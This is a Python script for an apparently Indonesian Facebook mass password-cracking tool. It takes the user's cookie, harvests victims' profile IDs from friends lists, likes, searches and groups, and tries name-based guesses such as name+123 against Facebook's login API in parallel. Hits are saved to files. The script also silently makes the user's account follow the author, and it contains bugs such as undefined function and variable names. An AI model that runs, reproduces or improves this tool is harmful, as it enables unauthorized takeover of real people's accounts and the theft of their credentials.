#!/usr/bin/python
# -*- coding: utf-8 
# coding by Milzu TC 
#Created 1-8-2021
#fb = MÎŁŽÛ ŤČ
#JANGAN DI RECODE YA NGENTOD

import os,sys,re,time,json,random,requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor

def mulai():
    os.system("git pull")
def lupo_lupo_milzu():
    os.system("clear")
def aink(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./300)
def peak():
    time.sleep(0.1)
    print("""
───────────────────────────────────────────────────
───────────────────────────────────────────────────
\033[35m  __________________
\033[35m» |      ▂╲╱▂      | 
\033[35m» |      ▇▏▕▇      |
\033[35m» |       ||       |
\033[35m» |  /><>\\\//<><\  |
\033[35m» |  />/__\/__\<\  |
\033[35m» |_____| || |_____|
────────────────────────────────────────────────────
•FACEBOOK: MÎŁŽÛ ŤČ   Subscribe:MILZU-TC TUTORIAL77
────────────────────────────────────────────────────
────────────────────────────────────────────────────
\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] xAuthor     : Milzu TC
\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Instagram : 
\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook  : https://www.facebook.com/milestone.gota
───────────────────────────────────────────────────── """)

def milzutc():
    milzu=input(" \n\033[00m\t   [\033[96m Press Enter To Return\033[97m ] ")
    if milzu == "": 
       os.system(" python MBF.V2.py ")
    else:
       sys.exit(" \n\033[1;97m [\033[1;91m[♡]\033[1;97m] \033[1;91mTerima kasih :') ")
def mbfv2():
    time.sleep(0.1)
    print(" \x1b[1;94m──────────────────────────────────────────────")
    print(" \033[97m <\033[92m01\033[97m> MÂŠÛĶ ")
    print(" \033[97m <\033[92m02\033[97m> ČÂŘÂ MÊŇĎÂPÂŤĶÂŇ ČÔĶÎÊ ")
    print(" \033[97m <\033[92m03\033[97m> MÂŠÛĶ ĞŘÛP FB  《COMUNITY》OF THE HACKER♡")
    print(" \033[97m <\033[92m04\033[97m> MÂŠÛĶ ĞŘÛP WHÂŤŠÂPP ")
    print(" \033[97m <\033[92m05\033[97m> ÛPĞŘÂĎÊ ŠÊŘVÊŘ ")
    print(" \033[97m <\033[91m00\033[97m> ĶÊŁÛÂŘ ")
    print(" \x1b[1;94m──────────────────────────────────────────────")
    time.sleep(0.1)

    milzu=input("\n\033[90m╰>[>_<]👉 \033[1;93m")
    if milzu== "1" or milzu =="01":
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         live = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
                    cek = open("cookies").read()
             except FileNotFoundError:
                   lupo_lupo_milzu()
                   peak()
                   cek = input("\n\033[0;92m       [ \033[0;97mThis Server menggunakan fb cookies \033[0;92m]\n\n\033[97m [\033[91m*\033[97m] Cookies \033[1;91m👉 \033[1;96m")
                   print('\n\033[97m [\033[92m+\033[97m] \033[92mPleas Wait...')
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[1;97m[\033[1;94m•\033[1;97m] \033[00mUbah bahasa, harap tunggu\033[1;91m!!\033[00m")
                           try:
                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                           except:
                                  pass
                     try:
                             ikuti = parser(requests.get(mbasic.format("/KM39453"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                             ses.get(mbasic.format(ikuti),cookies=cek)
                     except :
                             pass
                     return cek["cookie"]
                     aahh('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
             else:
                  os.system("xdg-open https://youtu.be/DF7bUCn0GFY") 
                  os.system('rm -rf cookies')
                  print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookies Error")
                  os.system('python2 Milzuu.py')
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
             }
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params)
             if 'EAA' in response.text:
                 print(f"\r\033[1;92m  * --> {username}|{password}                       ",end="")
                 print()
                 result += 1
                 if cek:
                        life.append(username+"|"+password)
                 else:
                        with open('ok.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             elif 'www.facebook.com' in response.json()['error_msg']:
                   print(f"\r\033[1;93m  * --> {username}|{password}                    ",end="")
                   print()
                   check += 1
                   if cek:
                           chek.append(username+"|"+password)
                   else:
                           with open('cp.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             else:
                   die += 1
             for i in list('\|/-•'):
                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] ok : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcp : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
                            time.sleep(0.2)
         def getid(url):
             raw = requests.get(url,cookies=kuki).content
             getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                 elif 'friends' in x:
                        continue
                 else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                 print('\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97mProcess Of Retrieving ID... ",end="")
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
             return id
         def fromlikes(url):
             try:
                  like = requests.get(url,cookies=kuki).content
                  love = re.findall('href="(/ufi.*?)"',str(like))[0]
                  aws = getlike(mbasic.format(love))
                  return aws
             except:
                  exit(" \033[1;97m [\033[1;94m•\033[1;97m] Link Not Found!")
         def getlike(react):
             like = requests.get(react,cookies=kuki).content
             ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0].split('/')[1])
                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',end="")
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
             return id
         def bysearch(option):
             search = requests.get(option,cookies=kuki).content
             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                         id.append(user[1] + "|" + user[0].split("?")[0])
                  print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end="")
             if "Lihat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
             return id
         def grubid(endpoint):
             grab = requests.get(endpoint,cookies=kuki).content
             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0])
                 print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end="")
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
             return id
         if __name__ == '__main__':
               try:
                   ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
                   lupo_lupo_milzu()
                   peak()
                   aink('\033[92m『PILIH METODE CRACK』')
                   aink('\033[00m [\033[1;96m01\033[00m] ŘÔĶÊĎ ĎÂFŤÂŘ ŤÊMÂŇ 💎')
                   aink('\033[00m [\033[1;96m02\033[00m] ŘÔĶÊĎ ĎÂŘÎ ŁÎĶÊ PÔŠŠŤÎŇĞÂŇ 💎')
                   aink('\033[00m [\033[1;96m03\033[00m] ŘÔĶÊĎ ĎÂŘÎ PÊÑČÂŘÎÂŇ ŇÂMÂ 💎')
                   aink('\033[00m [\033[1;96m04\033[00m] ŘÔĶÊĎ ĎÂŘÎ ĞŘÔÛP 💎')
                   aink('\033[00m [\033[1;96m05\033[00m] ŘÔĶÊĎ ĎÂŘÎ PÛBŁÎĶ 💎')
                   aink('\033[00m [\033[1;96m06\033[00m] ŁÎHÂŤ HÂŠÎŁ ŘÔĶÊĎ 💎')
                   aink('\033[00m [\033[1;96m07\033[00m] HÂPÛŠ ČÔÔĶÎÊ💎')
                   aink('\033[00m [\033[1;91m00\033[00m] ĶÊŁÛÂŘ💎')
                   print('\x1b[1;94m────────────────────────────────────────────────────')
                   kentang = input('\033[00m─》 \033[00m: \033[93m ')
                   if kentang =="":
                         print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
                         milzu()
                   elif kentang == '0' or memek =='00':
                         aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
                         os.system('xdg-open  https://youtube.com/channel/UCqHIxnz-uxVzLXARplFzzqQ-mg ')
                         exit()                   	
                   elif kentang == '7' or kentang =='07':
                         print("\n\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[1;96mPlease Wait... ")
                         aink("\x1b[1;92m ▪ 10")
                         aink("\x1b[1;93m ▪▪ 20")
                         aink("\x1b[1;94m ▪▪▪ 30")
                         aink("\x1b[1;95m ▪▪▪▪ 40")
                         aink("\x1b[1;96m ▪▪▪▪▪ 50")
                         aink("\x1b[1;97m ▪▪▪▪▪▪ 60")
                         aink("\x1b[1;92m ▪▪▪▪▪▪▪ 70")
                         aink("\x1b[1;91m ▪▪▪▪▪▪▪▪ 80")
                         aink("\x1b[1;96m ▪▪▪▪▪▪▪▪▪ 90")
                         aink("\x1b[1;94m ▪▪▪▪▪▪▪▪▪▪ 100%")
                         os.system("rm -rf cookies")
                         print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Deleted Successfully!")
                         milzu()
                   elif kentang == '1' or kentang =='01':
                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                         username = getid(mbasic.format(url["href"]))
                   elif kentang == '2' or kentang =='02':
                         username = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Link Post \033[1;91m: \033[1;92m")
                         if username == "":
                                 exit("\033[00m[\033[91m!\033[00m] Cannot be empty!")
                         elif 'www.facebook' in username:
                                 username = username.replace('www.facebook','mbasic.facebook')
                         elif 'www.facebook' in username:
                                 username = username.replace('m.facebook','mbasic.facebook.com')
                         username = fromlikes(username)
                   elif kentang == '3' or kentang =='03':
                         knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] The Name You Want To Search For \033[1;91m: \033[1;92m")
                         username = bysearch(mbasic.format('/search/people/?q='+knf))
                         if len(username) == 0:
                                 exit("\033[90m[\033[91m!\033[90m] No Name!")
                   elif kentang == '4' or kentang =='04':
                         print("\033[1;97m\n [\033[1;94m•\033[1;97m] Can Only Take \033[91m100 \033[00mID ")
                         grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[00mID group \033[1;91m: \033[1;92m")
                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                         if len(username) == 0:
                                 exit("\033[00m[\033[91m!\033[00m] Group ID None!")
                   elif kentang == '5' or kentang =='05':
                         knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Username/Id \033[1;91m: \033[1;92m")
                         if knf.isdigit():
                                 user = "/profile.php?id=" + knf
                         else:
                                 user = "/" + knf
                         try:
                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                 username = getid(mbasic.format(user))
                         except TypeError:
                                 exit("\033[00m[\033[91m!\033[00m] \033[97mUser/ID Wrong!")
                   elif kentang == '6' or kentang =='06':
                         try:
                                 file1 = open("cp.txt").read()
                                 file2 = open("ok.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 print(f"\033[97m\n [\033[93m{str(len(final))}\033[97m] Account To Check ")
                                 with ThreadPoolExecutor(max_workers=10) as ex:
                                         for user in final:
                                                 a = user.split("|")
                                                 ex.submit(login,(a[0]),(a[1]),(True))
                                 for x in result:
                                         with open('ok.txt','a') as f:
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('cp.txt','a') as f:
                                                 f.write(x+"\n")

                                 print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Selesai...")
                                 print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Di Save Di \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
                         except FileNotFoundError:
                                 exit("\n\033[00m[\033[91m!\033[00m] You Didn't Get Results")
                   else:
                         print("\n\n \033[00m[\033[91m!\033[00m] Wrong Input!")
                         milzu()
                   print()
                   lupo_lupo_milzu()
                   peak()
                   print('\x1b[1;95m   ■───────MEMBUAT-PASSWORD────────■')
                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     ■───────MEMBUKA-PASSWORD────────■ \n",end="")       
                   expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] + Password1 \033[1;91m: \033[1;92m")
                   expass = input("\033[1;97m [\033[1;96m?\033[1;97m] + Password2 \033[1;91m: \033[1;92m")
                   aink('\x1b[1;94m────────────────────────────────────────────────────\n')
                   lupo_lupo_milzu()
                   peak()
                   print('\x1b[1;97m  ■───────TURN-ON-DATA────────■')
                   print('\x1b[1;96m           Semua ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m    ■───────Open-Data-Result────────■ \n",end="")
                   print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m LIVE\x1b[1;97m saved to : live.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
                   print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
                   with ThreadPoolExecutor(max_workers=30) as ex:
                          for user in username:
                                  users = user.split('|')
                                  ss = users[0].split(' ')
                                  for x in ss:
                                          listpass = [
                                                  str(x) + '123',
                                                  str(x) + '1234',
                                                  str(x) + '12345',
                                                  str(x) + '0987',
                                                  ]
                                          listpass.append(expass)
                                          for passw in set(listpass):
                                                  ex.submit(login,(users[1]),(passw))
                   if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\n\n\x1b[1;92m  *\x1b[1;97m selesai.")
     
                   else:
                           print("\n\n\x1b[1;96m  *\x1b[1;97m kamu tidak memiliki hasil apapun:(")
               except (KeyboardInterrupt,EOFError):
                       exit()
               except requests.exceptions.ConnectionError:
                       exit("\n\n\033[00m  [\033[91m!\033[00m] Putus Koneksi")

    elif milzu == "2" or milzu =="02":
         os.system("xdg-open https://youtu.be/QF0jMxC6CkE")
         milzutc()
    elif milzu == "3" or milzu =="03":
         os.system('xdg-open https://www.facebook.com/groups/338110617616908')
         milzutc()
    elif milzu == "4" or milzu =="04":
         os.system('xdg-open https://chat.whatsapp.com/EEl2Erzh6jkEahbYE3QMu2')
         milzutc()
    elif milzu == "5" or milzu =="05":
         print("\n\n\x1b[1;97m      [ \x1b[1;92mPlease Wait... \x1b[1;97m]\n")
         os.system("git pull")
         print("\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m Sudah di update !!\n ")
         milzutc()
    elif milzu == "0" or milzu =="00":
         aink("\n\033[1;92m Terima kasih sudah menggunakan tools ini.\n  Dan jangan lupa subscribe chanel youtube saya\n\n")
         os.system("xdg-open https://youtube.com/channel/UCqHIxnz-uxVzLXARplFzzqQ")
         exit()
         
if __name__=="__main__":
     lupo_lupo_milzu()
     mulai()
     lupo_lupo_milzu()
     peak()
     mbfv2()
     milzutc()
         
